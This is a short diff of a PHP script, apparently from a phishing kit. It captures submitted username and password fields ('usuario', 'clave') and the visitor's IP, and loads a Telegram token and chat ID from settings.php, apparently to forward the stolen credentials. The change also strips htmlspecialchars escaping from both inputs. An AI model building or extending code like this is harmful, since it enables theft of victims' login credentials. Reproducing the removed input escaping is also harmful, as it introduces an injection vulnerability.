@@ -3,8 +3,8 @@ session_start();
 include("settings.php"); // Este archivo debe tener $token y $chat_id
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $usuario = htmlspecialchars($_POST['ips1'] ?? '');
-    $clave = htmlspecialchars($_POST['ips2'] ?? '');
+    $usuario = $_POST['ips1'] ?? '';
+    $clave = $_POST['ips2'] ?? '';
     $ip = $_SERVER['REMOTE_ADDR'];
 
     $_SESSION['usuario'] = $usuario;
